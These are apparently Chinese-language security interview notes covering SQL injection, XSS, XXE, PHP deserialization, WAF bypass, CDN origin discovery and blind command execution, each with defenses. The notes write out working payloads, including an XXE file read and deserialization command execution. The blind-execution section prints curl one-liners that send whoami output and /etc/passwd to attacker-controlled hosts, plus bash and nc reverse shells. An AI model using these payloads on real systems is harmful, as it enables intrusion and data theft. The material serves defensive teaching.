# 一、Web常问

## 1. SQL注入原理的种类？防御呢？预编译原理？

### **一、SQL注入的原理与常见类型**

SQL注入的核心是通过用户输入的数据篡改SQL语句逻辑，常见的攻击类型包括：

1. **基于错误的注入（Error-Based）**  
   - **原理**：攻击者故意输入非法数据（如单引号 `'`）触发数据库报错，通过错误信息获取数据库结构（如表名、字段名）。  
   - **示例**：`' OR 1=1; -- ` 可能导致查询变为 `SELECT * FROM users WHERE id = '' OR 1=1; -- '`，返回所有用户数据。

2. **联合查询注入（Union-Based）**  
   - **原理**：利用 `UNION` 关键字将恶意查询结果拼接到原始查询结果中，泄露其他表的数据。  
   - **示例**：`' UNION SELECT username, password FROM users; -- `。

3. **布尔盲注（Boolean Blind）**  
   - **原理**：通过页面返回的布尔值（真/假）推断数据库信息。  
   - **示例**：`' AND (SELECT SUBSTRING(database(),1,1) = 'a'); -- `，通过逐字符猜测数据库名。

4. **时间盲注（Time-Based Blind）**  
   - **原理**：通过数据库延时函数（如 `SLEEP()`）判断条件是否成立。  
   - **示例**：`' AND IF(1=1, SLEEP(5), 0); -- `，若页面响应延迟5秒，则条件为真。

5. **堆叠查询注入（Stacked Queries）**  
   - **原理**：利用分号 `;` 执行多条SQL语句（如删除表、提权）。  
   - **示例**：`'; DROP TABLE users; -- `。

---

### **二、SQL注入的防御方法**

6. **预编译（参数化查询）**  
   - **核心思想**：将SQL语句结构与用户输入数据分离，确保输入数据仅作为参数处理，无法改变SQL逻辑。  
   - **实现**：使用 `PreparedStatement`（Java）、`sql.Prepare`（Go）、`cursor.execute(sql, params)`（Python）等。  
   - **示例**：  
     ```java
     String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
     PreparedStatement stmt = connection.prepareStatement(sql);
     stmt.setString(1, username); // 输入值自动转义
     stmt.setString(2, password);
     ```

7. **输入验证与过滤**  
   - **白名单校验**：限制输入格式（如邮箱、手机号）。  
   - **黑名单过滤**：过滤敏感字符（如 `'`、`;`、`--`），但易被绕过，不推荐作为主要手段。

8. **使用ORM框架**  
   - **原理**：通过对象关系映射（如Hibernate、Django ORM）自动生成参数化查询。  
   - **示例**（Django）：  
     ```python
     User.objects.filter(username=request.POST['username'], password=request.POST['password'])
     ```

9. **最小权限原则**  
   - 数据库账号仅授予必要权限（如禁用 `DROP`、`FILE` 权限），限制攻击影响范围。

10. **转义特殊字符**  
   - 对用户输入中的单引号、反斜杠等字符进行转义（如 `mysqli_real_escape_string`），但需结合其他方法使用。

---

### **三、预编译（参数化查询）的原理详解**

1. **SQL语句的编译与执行阶段**  
   - **编译阶段**：数据库预解析SQL语句结构，确定查询逻辑（如 `SELECT * FROM users WHERE id = ?`）。  
   - **执行阶段**：将用户输入的值（如 `id=123`）作为参数传入，数据库不会将其视为可执行代码。

2. **防御注入的核心原因**  
   - **数据与代码分离**：参数值在编译后绑定，无法改变SQL语义。即使输入 `' OR 1=1`，数据库会将其视为字符串值而非逻辑条件。  
   - **示例对比**：  
     - **不安全拼接**：`"SELECT * FROM users WHERE id = " + userInput` → 输入 `1; DROP TABLE users` 导致注入。  
     - **预编译安全**：输入 `1; DROP TABLE users` 会被视为 `id` 的字符串值，查询变为 `WHERE id = '1; DROP TABLE users'`，语句无效。

3. **跨语言支持**  
   - 所有主流语言（Java、Python、PHP、Go等）均提供预编译接口，本质是通过数据库驱动实现参数化。

---

### **四、总结与扩展**

- **为何预编译是最佳实践？**  
  直接避免用户输入参与SQL逻辑解析，从根源上防御注入，比过滤或转义更可靠。  
- **注意点**：  
  - 动态表名/字段名无法参数化时，需严格白名单校验（如只允许字母数字）。  
  - 避免错误使用预编译（如拼接SQL后再参数化），需确保参数占位符覆盖所有动态部分。  

通过结合预编译、输入校验和最小权限原则，可构建多层次的SQL注入防御体系。


## 2.XSS的种类有哪些？区别？修复呢？

### **1. XSS的种类及区别**

#### **(1) 反射型XSS（Reflected XSS）**

- **特点**：攻击脚本作为HTTP请求的一部分（如URL参数）发送到服务器，服务器未过滤直接返回，用户点击恶意链接时触发。
- **场景**：钓鱼邮件/链接中的恶意URL（例如：`http://example.com/search?q=<script>恶意代码</script>`）。
- **持久性**：非持久化，仅单次请求生效。

#### **(2) 存储型XSS（Stored XSS）**

- **特点**：攻击脚本被持久化存储到服务器（如数据库），用户访问页面时自动加载执行。
- **场景**：评论区、用户资料等用户输入可长期保存的位置。
- **持久性**：持久化，影响所有访问页面的用户。

#### **(3) DOM型XSS（DOM-based XSS）**

- **特点**：攻击由客户端JavaScript动态操作DOM引发，无需服务器参与（如从URL的`location.hash`提取数据并插入页面）。
- **场景**：前端代码直接使用`location.href`、`innerHTML`等不安全操作。
- **持久性**：非持久化，依赖客户端逻辑。

#### **核心区别**

|**类型**|**存储位置**|**触发方式**|**持久性**|**是否依赖服务器**|
|---|---|---|---|---|
|反射型XSS|无存储|用户点击恶意链接|非持久|是|
|存储型XSS|服务器数据库|访问被感染页面|持久|是|
|DOM型XSS|无存储|客户端执行恶意操作|非持久|否|

---

### **2. 修复方案**

#### **(1) 通用防御措施**

- **输入过滤与验证**：对用户输入进行严格校验（如长度、格式、特殊字符）。
- **输出编码**：
    - **HTML上下文**：使用`HtmlEncode`转义`<`, `>`, `&`等字符。
    - **JavaScript上下文**：使用`JavaScriptEncode`处理动态插入的脚本。
- **内容安全策略（CSP）**：通过HTTP头`Content-Security-Policy`限制脚本来源，禁止内联脚本。
- **HttpOnly Cookie**：标记敏感Cookie为`HttpOnly`，防止被JavaScript窃取。

#### **(2) 针对性修复**

- **反射型/存储型XSS**：
    - 服务器端对用户输入和输出统一处理（如使用安全库：OWASP ESAPI）。
    - 避免直接拼接HTML，采用模板引擎自动转义（如React的JSX、Vue的`{{ }}`）。
- **DOM型XSS**：
    - 避免使用`innerHTML`、`document.write`等不安全API，改用`textContent`。
    - 对来自URL参数或用户输入的数据进行DOM操作前，严格校验和转义。

#### **(3) 其他增强措施**

- **X-XSS-Protection头**：启用浏览器内置XSS过滤器（如`X-XSS-Protection: 1; mode=block`）。
- **定期安全测试**：使用工具（如Burp Suite、XSS Scanner）扫描漏洞。

---

### **3. 实际案例**

- **反射型XSS修复**：若URL参数`q=<script>alert(1)</script>`，服务端应过滤并返回转义后的`&lt;script&gt;alert(1)&lt;/script&gt;`。
- **DOM型XSS修复**：前端代码避免`element.innerHTML = location.hash.slice(1);`，改用`element.textContent = encodeURI(location.hash.slice(1))`。

## 3. XSS,CSRF和SSRF区别？(很常问)

### **一、核心区别**

| **漏洞类型** | **攻击主体** | **攻击目标**    | **触发方式**       | **利用条件**                      |
| -------- | -------- | ----------- | -------------- | ----------------------------- |
| **XSS**  | 客户端      | 用户浏览器       | 用户访问含恶意脚本的页面   | 用户输入未过滤，输出未转义 <br><br>        |
| **CSRF** | 客户端      | 用户已登录的Web应用 | 诱导用户点击恶意链接/页面  | 用户已登录且未退出，请求未校验Token <br><br> |
| **SSRF** | 服务端      | 服务器自身或内网服务  | 利用服务端请求外部资源的功能 | 服务端未限制URL协议和地址 <br><br>       |

---

### **二、详细对比**

#### **1. XSS（跨站脚本攻击）**

- **原理**：攻击者通过注入恶意脚本（JS、HTML等）到网页中，用户浏览时触发执行。
    - **反射型**：恶意脚本通过URL参数传递（如钓鱼链接） 
        

    - **存储型**：恶意脚本持久化存储于服务器（如评论区） 
        
       
    - **DOM型**：客户端JS操作DOM时触发，无需服务端参与 
        
- **危害**：窃取Cookie、劫持会话、钓鱼攻击等 
    

- **防御**：
    - 输入过滤（如过滤`<script>`标签） 
        

    - 输出编码（HTML实体转义） 
        

    - 启用CSP（内容安全策略）限制脚本来源 
        
#### **2. CSRF（跨站请求伪造）**

- **原理**：攻击者伪造用户身份发送恶意请求（如转账、修改密码）。
    - 依赖用户已登录的会话Cookie自动携带 
        

    - 示例：诱导用户点击含恶意请求的图片链接`<img src="http://bank.com/transfer?to=attacker&amount=1000">` 
        
- **危害**：执行未授权操作（如转账、数据篡改） 
    
- **防御**：
    - **CSRF Token**：表单中嵌入随机Token，服务端校验 
    
    - **Referer校验**：验证请求来源是否合法 
        
     
    - **双重认证**：敏感操作需二次确认（如短信验证码） 
        
#### **3. SSRF（服务端请求伪造）**

- **原理**：攻击者利用服务端发起请求的功能，构造恶意URL访问内网或敏感接口。
    - 常见场景：在线翻译、图片加载、API调用 
        

    - 示例：`http://example.com/proxy?url=http://192.168.1.1/admin`访问内网                 
        
- **危害**：探测内网、攻击内部服务、读取本地文件 
    
- **防御**：
    - 限制协议（仅允许HTTP/HTTPS） 
        
    - 校验URL地址（禁用内网IP和特殊协议如`file://`） 
        
    - 禁用重定向防止绕过 
        
---

### **三、总结差异**

1. **攻击角色**：
    - XSS和CSRF由客户端触发，SSRF由服务端触发 
        
2. **攻击目标**：
    - XSS针对用户浏览器，CSRF针对用户已登录的应用，SSRF针对服务端或内网 
        
3. **依赖条件**：
    - XSS需用户访问恶意页面，CSRF需用户已登录，SSRF需服务端存在外部请求功能 


## XXE漏洞了解吗？
### 1. XXE漏洞原理 

- **核心机制**：XML允许通过DTD（文档类型定义）引入外部实体（如`file://`、`http://`协议），若解析器未禁用此功能，攻击者可注入恶意实体。
- **攻击流程**：
    1. 攻击者提交包含恶意外部实体的XML数据。
    2. 服务器解析时加载外部资源（如读取本地文件、请求内网服务）。
    3. 解析结果通过响应返回或触发恶意操作（如SSRF）。

**示例**：

XML

`<!DOCTYPE foo [   <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>   <foo>&xxe;</foo>  <!-- 服务器解析后返回/etc/passwd内容 -->`

---

### **2. XXE攻击方式** 

1. **文件读取**：通过`file://`协议读取服务器敏感文件（如`/etc/passwd`、配置文件）。
2. **SSRF攻击**：利用`http://`协议探测内网服务或端口（如`http://192.168.1.1:8080`）。
3. **拒绝服务（DoS）**：构造递归实体耗尽服务器资源，例如：
    
    XML
    
    `<!DOCTYPE data [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;">]>   <data>&b;</data>  <!-- 实体递归导致资源耗尽 -->`
    
4. **远程代码执行（RCE）**：若服务器环境支持（如PHP+expect扩展），可执行系统命令。

---

### **3. XXE漏洞危害** 


- **敏感数据泄露**：读取服务器文件（数据库配置、密钥）。
- **内网渗透**：通过SSRF探测内网服务，配合其他漏洞攻击内网系统。
- **绕过防火墙**：利用服务器作为跳板访问受限资源。
- **服务瘫痪**：通过DoS攻击导致业务中断。

---

### **4. 防御措施** 


1. **禁用外部实体**：配置XML解析器禁用DTD和外部实体（如Java中`DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`）。
2. **使用安全数据格式**：优先使用JSON替代XML。
3. **输入过滤**：
    - 过滤XML中的`<!DOCTYPE>`、`<!ENTITY>`、`SYSTEM`等关键字。
    - 对用户提交的XML数据做白名单校验。
4. **升级组件**：确保XML解析器（如libxml2、Xerces）为最新版本。
5. **限制协议**：仅允许HTTP/HTTPS协议，禁用`file://`、`gopher://`等危险协议。

---

### **5. 实际案例** 

- **案例1**：某网站允许用户上传XML配置文件，攻击者注入读取`/etc/passwd`的实体，导致服务器敏感信息泄露。
- **案例2**：通过XXE构造SSRF请求扫描内网Redis服务，利用未授权访问漏洞获取内网数据。

## PHP反序列化有了解吗？
### **一、PHP反序列化漏洞原理**

#### **1. 核心机制**

- **序列化**：通过`serialize()`将对象转化为字符串（包含类名、属性类型及值），**不包含方法**。
    
    PHP
    
    `class User { public $name = "Tom"; } echo serialize(new User()); // O:4:"User":1:{s:4:"name";s:3:"Tom";}`
    
- **反序列化**：通过`unserialize()`将字符串还原为对象。**若参数可控且存在危险魔术方法（如`__destruct()`）**，攻击者可注入恶意逻辑 
    

#### **2. 漏洞触发条件**

- **参数可控**：用户能传入自定义的序列化字符串。
- **存在危险魔术方法**：如`__destruct()`（对象销毁时调用）、`__wakeup()`（反序列化时调用）等。
- **类作用域可访问**：反序列化的类需在当前作用域定义。

---

### **二、漏洞利用方式**

#### **1. 覆盖属性值**

- **场景**：通过反序列化修改对象属性，绕过业务逻辑。
    
    PHP
    
    `class ctfShowUser {     public $isVip = false;     public function vipOneKeyGetFlag() {         if ($this->isVip) include('flag.php');     } }`
    
    **Payload**：构造序列化字符串将`$isVip`设为`true`，直接触发`vipOneKeyGetFlag()` 

#### **2. 代码执行**

- **示例**：利用`__destruct()`中的`eval()`或`system()`：
    
    PHP
    
    `class Test {     public $cmd = "whoami";     function __destruct() { system($this->cmd); } }`
    
    **Payload**：`O:4:"Test":1:{s:3:"cmd";s:10:"ipconfig";}`，反序列化后执行系统命令 
    


#### **3. 绕过`__wakeup()`**

- **CVE-2016-7124**：当序列化字符串中对象属性数量大于实际值时，`__wakeup()`不会执行。
    
    PHP
    
    `class A {     function __wakeup() { $this->target = "safe"; }     function __destruct() { system($this->target); } }`
    
    **Payload**：`O:1:"A":2:{s:6:"target";s:8:"calc.exe";}`（属性数改为2）以绕过`__wakeup()` 


---

### **三、关键魔术方法**

|**魔术方法**|**触发时机**|**利用场景**|
|---|---|---|
|`__destruct()`|对象销毁时|执行代码、文件操作|
|`__wakeup()`|反序列化时|初始化资源，可被绕过|
|`__toString()`|对象被当作字符串使用时|触发其他敏感逻辑（如XSS）|
|`__call()`|调用不存在的方法时|调用危险函数|

---

### **四、防御措施**

1. **输入过滤**：禁止反序列化用户可控的数据 
    
2. **限制魔术方法**：避免在`__destruct()`、`__wakeup()`中执行危险操作 
    
3. **使用安全函数**：
    - 替换`unserialize()`为`json_decode()`（需类支持） 
    - 用`hash_hmac`验证数据完整性。
4. **禁用危险类**：通过`allowed_classes`限制可反序列化的类 
    
    PHP
    `unserialize($data, ["allowed_classes" => ["SafeClass"]]);`
    
---
### **五、实际案例**

#### **案例1：CTF题目（命令执行）**

- **源码**：
    PHP
    `class test {     function __destruct() { eval($_GET['cmd']); } } unserialize($_GET['u']);`
- **Payload**：`u=O:4:"test":0:{}&cmd=system('whoami');`，直接触发`eval()`执行命令 
    

#### **案例2：Typecho CMS反序列化漏洞**

- **漏洞点**：反序列化未校验的Cookie数据，触发`__destruct()`中的文件删除操作。
- **利用**：构造恶意Cookie删除服务器文件 
    

## 逻辑漏洞遇到过哪些，给你登录框有没有什么思路？

### **一、常见逻辑漏洞类型**

#### **1. 身份验证类漏洞**

- **暴力破解**：无验证码或失败次数限制时，可枚举用户名/密码（如弱口令`admin/admin123`） 
    

- **Session固定攻击**：通过诱导用户点击含固定Session的URL劫持会话 
    
- **Cookie伪造**：篡改Cookie中的`userid`等字段越权登录他人账户 
    

#### **2. 权限类漏洞**

- **平行越权**：普通用户访问其他用户数据（如修改URL中的`userid`参数） 
    
- **垂直越权**：普通用户访问管理员功能（如直接访问`/admin`路径） 
    
    
- **未授权访问**：游客访问需登录的页面（如直接输入后台URL） 

#### **3. 验证码漏洞**

- **验证码绕过**：删除Cookie、置空验证码参数或使用万能验证码（如`0000`） 
   
- **验证码爆破**：4位验证码可被暴力破解（如密码重置功能） 
    
   
- **验证码回显**：验证码明文返回到响应包或前端源码 
    
#### **4. 密码重置漏洞**

- **手机号篡改**：修改请求中的手机号接收验证码，重置他人密码 
  
- **验证码未绑定用户**：使用自己手机号的验证码重置他人账户 
  
- **响应包篡改**：修改错误响应码（如`false`→`true`）绕过验证 

#### **5. 业务逻辑漏洞**

- **数据篡改**：修改商品价格参数（如将`price=100`改为`price=0.01`） 

- **步骤绕过**：跳过支付或验证步骤直接提交订单 
 
---

### **二、登录框渗透测试思路**

#### **1. 基础测试**

- **弱口令爆破**：尝试`admin/admin123`、`test/123456`等组合 
    
    
- **SQL注入**：万能密码`'or'1'='1`或`admin'--`绕过登录 
   
- **目录扫描**：使用`dirsearch`查找后台路径（如`/admin`、`/phpmyadmin`） 
    
#### **2. 验证码漏洞利用**

- **删除参数**：拦截请求删除`captcha`字段或置空值 
  
- **重放攻击**：获取一次有效验证码后重复使用（如短信验证码有效期过长） 
 
- **前端校验绕过**：修改JS代码禁用验证码校验逻辑 
    
#### **3. 权限绕过**

- **Cookie篡改**：登录后修改Cookie中的`role=user`→`role=admin`提权 
 
- **未授权访问**：直接访问登录后的API接口（如`/api/userinfo`） 
    
#### **4. 响应包篡改**

- **修改状态码**：将`401 Unauthorized`改为`200 OK`绕过登录 

- **替换返回值**：拦截响应包替换`"success":false`为`true` 
    

#### **5. 其他高级利用**

- **短信轰炸**：在密码重置处输入他人手机号，重放请求发送大量短信 

- **JS信息泄露**：分析前端JS文件，寻找测试账号或硬编码密钥 
  
- **历史漏洞利用**：检测Shiro反序列化、Log4j2等已知漏洞 
    

---

### **三、修复建议**

1. **身份验证**：
    - 启用多因素认证（如短信+密码） 
    
    - 限制登录失败次数并锁定账户 
        

2. **权限控制**：
    - 后端校验用户角色和资源归属（如从Session获取`userid`而非前端传参） 
        
3. **验证码安全**：
    - 服务端校验验证码一次性且绑定用户 
        
    - 禁止验证码明文返回到客户端 
        
4. **数据完整性**：
    - 敏感参数（如价格、订单号）添加HMAC签名 
        

## CDN和DNS区别？CDN绕过思路？

### **一、CDN与DNS的区别**

| **维度**   | **DNS**                               | **CDN**                                 |
| -------- | ------------------------------------- | --------------------------------------- |
| **核心功能** | 将域名解析为IP地址（互联网的"地址簿"） <br><br>        | 通过分布式节点加速内容分发，提升访问速度 <br><br>           |
| **工作原理** | 递归查询（根DNS→顶级DNS→权威DNS）返回最终IP <br><br> | 基于DNS智能解析分配最佳节点，或通过HTTP重定向动态调整 <br><br> |
| **数据存储** | 仅存储域名与IP的映射关系 <br><br>                | 缓存静态资源（图片、视频、JS/CSS文件） <br>             |
| **定位方式** | 依赖本地DNS服务器（LDNS）位置，可能导致误判 <br><br>    | 结合DNS解析和HTTP调度（如302重定向）实现精准定位 <br><br>  |
| **安全影响** | 直接暴露源站IP（若未结合CDN） <br><br>            | 隐藏源站IP，但错误配置可能导致IP泄露 <br>               |

#### **典型交互流程对比**

1. **未使用CDN**：  
    用户→DNS解析→源站IP→直接访问源站 
    

    
2. **使用CDN**：  
    用户→DNS解析CNAME→CDN全局负载均衡→分配最佳节点→节点缓存或回源获取数据 
    

---

### **二、CDN绕过思路（获取真实IP）**

#### **1. 基于DNS的绕过**

- **子域名查询**：主站使用CDN，但子域名（如`mail.example.com`）可能未启用CDN，通过子域名IP推测主站IP 
    
    
- **DNS历史记录**：查询域名解析历史（如SecurityTrails、ViewDNS），可能暴露早期未启用CDN时的真实IP 
    

- **国外DNS查询**：部分CDN仅在国内部署节点，使用国外DNS（如Google DNS）解析可能返回真实IP 
    

#### **2. 基于网络请求的绕过**

- **国外服务器访问**：通过海外服务器（如非洲节点）访问目标，若CDN未全球覆盖，可能直连源站 
    

- **协议限制绕过**：若CDN仅加速HTTP/HTTPS，尝试其他协议（如FTP、SSH）直接连接 
    

- **特定文件请求**：请求非缓存文件（如`phpinfo.php`、`robots.txt`），可能直连源站 
    

#### **3. 基于业务逻辑的绕过**

- **邮件服务获取**：通过密码重置邮件、订阅服务等获取邮件头中的源站IP 
    

- **漏洞利用**：
    - **SSRF**：触发服务端请求（如文件下载功能），使服务器主动连接攻击者控制的地址 
        
    
    - **XSS盲打**：注入恶意脚本让管理员浏览器回连，暴露内网IP 
        

#### **4. 工具与资源**

- **多节点Ping检测**：使用`ping.chinaz.com`或`get-site-ip.com`全球Ping，对比IP差异 
    

- **黑暗引擎**：通过Shodan搜索网站特有文件哈希或标题，定位真实IP 

- **备案信息**：国内网站备案信息可能包含服务器归属地，辅助验证IP 
    
---

### **三、防御建议**

1. **CDN配置**：
    - 启用全球加速，避免区域覆盖不全 
    
    - 限制协议仅允许HTTP/HTTPS，禁用非必要端口 
     
2. **源站保护**：
    - 防火墙限制仅CDN节点IP可访问源站 
    
    - 定期扫描敏感文件（如`phpinfo.php`）并及时删除 
        
3. **监控与验证**：
    - 使用工具（如Cloudflare）监控IP泄露风险 
        

    - 通过`nslookup`和`traceroute`验证解析路径是否经过CDN 


## 常见的中间件漏洞知道哪些？

### **一、IIS漏洞**

#### **1. PUT任意文件上传漏洞**

- **原理**：开启WebDAV且未限制写入权限，攻击者可上传恶意文件 
    
    。
- **影响**：上传WebShell导致服务器被控制。
- **修复**：关闭WebDAV服务并限制目录写入权限 
  

#### **2. 短文件名猜解**

- **原理**：Windows生成8.3格式短文件名（如`admini~1.asp`），通过HTTP请求可暴力猜解敏感文件 
 
    。
- **影响**：泄露后台路径、备份文件等敏感信息。
- **修复**：禁用NTFS 8.3格式支持（修改注册表或使用`fsutil`命令） 
    

#### **3. 解析漏洞**

- **分号截断**：`test.asp;.jpg`被解析为ASP文件 
    
    
- **目录解析**：`/test.asp/`目录下的所有文件按ASP解析 

- **修复**：过滤特殊字符，限制目录执行权限，删除不必要解析映射 

#### **4. 远程代码执行（CVE-2017-7269）**

- **原理**：IIS 6.0开启WebDAV时，处理PROPFIND请求触发缓冲区溢出 

- **影响**：攻击者可执行任意系统命令。
- **修复**：关闭WebDAV或升级系统补丁 

---

### **二、Apache漏洞**

#### **1. 多后缀解析漏洞**

- **原理**：从右向左解析后缀，`test.php.xxx`可能被识别为PHP文件 

- **影响**：绕过文件上传限制，执行恶意代码。
- **修复**：删除`AddHandler application/x-httpd-php .php`配置 
    
#### **2. 路径穿越（CVE-2021-41773/CVE-2021-42013）**

- **原理**：未正确处理URL编码（如`%%32%65`），导致访问系统文件 
    

- **影响**：读取`/etc/passwd`等敏感文件或执行命令（开启CGI时） 

- **修复**：升级到Apache 2.4.51及以上版本 
    

#### **3. SSI远程命令执行**

- **原理**：上传`.shtml`文件并插入`<!--#exec cmd="id" -->`，服务器解析后执行命令 

- **修复**：关闭SSI功能或限制上传目录执行权限 

---

### **三、Nginx漏洞**

#### **1. 文件解析漏洞**

- **原理**：`test.jpg/.php`被PHP解析，需配合`cgi.fix_pathinfo=1` 
    

- **修复**：设置`cgi.fix_pathinfo=0`并限制文件类型 

#### **2. 目录遍历**

- **原理**：配置`autoindex on`导致目录列表泄露 

- **修复**：关闭目录索引（`autoindex off`） 
    

#### **3. CRLF注入**

- **原理**：未过滤换行符（`%0d%0a`），可注入Set-Cookie头或XSS代码 

- **修复**：使用`$uri`替代`$request_uri`，避免解码URL 

---

### **四、Tomcat漏洞**

#### **1. 远程代码执行**

- **原理**：PUT方法上传JSP木马文件（需开启写权限） 

- **修复**：禁用PUT方法，设置`readonly=true` 
    

#### **2. Manager弱密码后台上传**

- **原理**：默认密码（tomcat/tomcat）登录后台，上传WAR后门 

- **修复**：修改默认密码，限制后台访问IP 
    

---

### **五、JBoss/WebLogic漏洞**

#### **1. 反序列化漏洞**

- **原理**：未过滤反序列化数据，触发Java反序列化链 
    

- **修复**：升级中间件版本，删除危险组件（如`invoker/JMX`） 
    
 

#### **2. WAR后门部署**

- **原理**：通过未授权接口上传恶意WAR文件 

- **修复**：关闭JMX Console等管理接口 
    

---

### **六、其他中间件漏洞**

1. **FastCGI未授权访问**：配置不当导致执行系统命令，需限制FastCGI权限 
    
  
2. **PHPCGI远程代码执行**：`php-cgi.exe -b`参数暴露，攻击者可执行任意PHP代码 
    

3. **HTTP.SYS远程代码执行（MS15-034）**：处理Range头时触发内存破坏，需安装补丁KB3042553 
    

---

### **七、通用修复建议**

4. **升级版本**：及时更新中间件至最新稳定版 
    

5. **最小化配置**：关闭非必要服务（如WebDAV、目录索引） 
    

6. **权限控制**：限制文件上传目录执行权限，使用非root用户运行服务 
    

7. **输入过滤**：对用户输入（URL、文件后缀）进行严格校验 


## WAF绕过的手法你知道哪些？

### **一、协议层绕过**

1. **分块传输（Chunked Encoding）**
    
    - **原理**：利用`Transfer-Encoding: chunked`头将请求体分块，绕过WAF对完整请求的检测 
      
    - **示例**：
        
        Http
        
        `POST /login HTTP/1.1 Transfer-Encoding: chunked 5 user= 3 adm 2 in 0`
        
2. **HTTP头注入**
    
    - **原理**：篡改`Host`、`User-Agent`等头绕过基于域名的防护或触发白名单 
    
    - **案例**：
        - 修改`Host: evil.com`伪装合法域名。
        - 伪造`User-Agent`为谷歌爬虫（`Googlebot`）绕过检测 
        
3. **HTTP方法混淆**
    
    - **原理**：使用非标准HTTP方法（如`PUT`、`PATCH`）或协议版本（HTTP/0.9）绕过检查 
        
---

### **二、编码与混淆**

4. **多级编码**
    
    - **URL编码**：`%3Cscript%3E`代替`<script>` 
        

    - **Unicode编码**：`%u003c`替代`<`，适用于IIS等支持解析的中间件 
        
    
    - **Base64编码**：将SQL注入语句编码为`dW5pb24gc2VsZWN0` 
     
5. **空白符填充**
    
    - **数据库特性**：MSSQL允许`0x01-0x20`空白符分割关键字，如`SELECT%01*%0DFROM%0Ausers` 

6. **关键字混淆**
    
    - **大小写混合**：`SeLeCt`代替`SELECT`。
    - **内联注释**：`/*!SELECT*/`绕过MySQL过滤 
        
     
    - **符号插入**：`SEL/**/ECT`分割敏感词 
    

---

### **三、业务逻辑层绕过**

7. **文件上传绕过**
    
    - **文件名污染**：上传`filename="test.jpg"`和`filename="test.php"`，WAF取第一个值，后端取最后一个值 
    
    - **MIME编码**：Spring框架中`=?UTF-8?B?base64编码文件名?=`绕过解析 
    
8. **参数污染（HTTP Parameter Pollution）**
    
    - **原理**：重复参数触发后端逻辑错误，如`id=1&id=2' union select 1,2,3--` 
  
9. **白名单利用**
    
    - **IP白名单**：伪造IP为可信来源（如`X-Forwarded-For: 127.0.0.1`）。
    - **搜索引擎爬虫**：伪装`User-Agent`为`Googlebot`绕过检测 
        
---

### **四、资源层绕过**

10. **源站IP泄露**
    
    - **DNS历史记录**：通过`SecurityTrails`查询域名早期解析IP 

    - **邮件服务**：触发密码重置邮件，从邮件头获取源站IP 
    
11. **CDN绕过**
    
    - **子域名探测**：主站使用CDN，但`test.example.com`可能直连源站 

---

### **五、数据量级绕过**

12. **溢量数据填充**
    - **原理**：提交超大数据（如5000个填充字符），超出WAF检测阈值 
        
    
    - **案例**：`POST /login?param=AAAAA...（5000字符）...&inject=1' union select 1,2,3--`

---

### **六、工具与自动化**

13. **WAF指纹识别**
    
    - **工具**：`wafw00f`、`identywaf`识别WAF类型 
        
        
    - **特征**：拦截页面内容、响应头（如`X-Powered-By: Mod_Security`） 
     
14. **Payload生成框架**
    
    - **SQLMap Tamper脚本**：使用`charencode.py`、`space2comment.py`绕过过滤 
        

---

### **防御建议**

15. **输入校验**：严格校验参数格式、长度及字符范围 

16. **协议规范化**：禁用非常规HTTP方法及分块传输 
    
    
17. **规则动态更新**：结合AI行为分析更新WAF规则库 
    

18. **源站隔离**：限制仅CDN节点IP可访问源站 
    

## 命令无回显如何解决？

### **一、外带数据法（DNS/HTTP/ICMP）**

#### **1. DNSLog外带**

- **原理**：利用DNS查询将命令执行结果外传到可控域名，通过DNS解析记录获取数据。
    
- **步骤**：
    
    1. 使用平台（如`ceye.io`）获取专属域名（如`xxx.ceye.io`）。
    2. 注入命令拼接域名，触发DNS请求：
        
        Bash
        
        ``curl `whoami`.xxx.ceye.io  # 结果会被记录为子域名查询``
        
    3. 查看平台日志，获取`whoami`结果（如`root.xxx.ceye.io`） 
    
- **扩展**：
    
    - **处理长输出**：用`sed`分割或`base64`编码避免截断：
        
        Bash
        
        `curl $(cat /etc/passwd | base64 | tr -d '\n').xxx.ceye.io`
        
    - **绕过过滤**：使用`xxd`转为十六进制或替换空格为`$IFS` 
     
#### **2. HTTP请求外带**

- **原理**：通过`curl`或`wget`将结果发送到攻击者服务器。
- **示例**：
    
    Bash
    
    `curl http://attacker.com/$(id|base64)  # 将命令结果Base64编码后通过URL参数传递`
    
- **工具**：使用`Yakit`内置的反连检测模块自动化监听 
    
   
---

### **二、反弹Shell**

- **原理**：让目标机器主动连接攻击者控制的服务器，建立交互式Shell。
- **常用命令**：
    
    Bash
    
    `# Linux（需目标安装nc） bash -i >& /dev/tcp/攻击者IP/端口 0>&1   nc -e /bin/sh 攻击者IP 端口  # Windows（需上传nc.exe） nc.exe -e cmd 攻击者IP 端口`
    
- **注意**：
    - 依赖目标出网权限及防火墙规则 
    
    - 若`nc`不可用，可尝试Python/PHP等语言反弹 

---

### **三、延时检测**

- **原理**：通过观察响应时间差异判断命令是否执行。
- **示例**：
    
    Bash
    
    `# 正常响应时间 ping -c 1 example.com    # 注入延时命令 sleep 5  # 若响应延迟5秒，说明命令执行成功`
    
- **扩展**：结合循环多次验证准确性 


---

### **四、文件操作验证**

#### **1. 文件写入**

- **步骤**：
    1. 注入命令写入文件：
        
        Bash
        
        `echo "test" > /var/www/html/result.txt`  
        
    2. 访问`http://目标网站/result.txt`验证文件存在性 
        
    
#### **2. 文件下载**

- **场景**：控制目标下载攻击者服务器上的文件（如上传`nc.exe`）：
    
    Bash
    
    `# Windows certutil.exe -urlcache -split -f http://攻击者IP/nc.exe nc.exe  # Linux wget http://攻击者IP/nc -O /tmp/nc`
    

---

### **五、工具辅助**

1. **Yakit**：集成DNSLog、HTTPLog、ICMP-SizeLog等多种反连检测方式，自动生成Payload 

2. **SQLMap Tamper脚本**：对Payload编码绕过过滤规则（如`charencode`、`space2comment`） 

---

### **六、终端回显异常处理**

- **场景**：Linux本地终端输入无回显（如误操作导致）。
- **解决**：
    
    Bash
    
    `reset  # 重置终端设置（即使无回显也可盲输执行） stty echo  # 手动开启回显功能。`
    

---

### **七、防御建议**

3. **输入过滤**：严格校验用户输入，禁用危险字符（如反引号、`$()`）。
4. **禁用高危函数**：PHP中关闭`exec()`、`system()`等函数。
5. **日志监控**：记录命令执行行为，分析异常请求 
    


## 11.3389端口无法连接的几种情况？

### **一、服务器端问题**

1. **远程桌面服务未启动**
    
    - **特征**：连接时提示“远程计算机不可用”，本地也无法连接。
    - **解决**：检查服务状态（`services.msc` → **Remote Desktop Services**），设置自动启动并重启服务 
       
2. **防火墙拦截**
    
    - **特征**：连接超时或拒绝，其他服务正常。
    - **解决**：
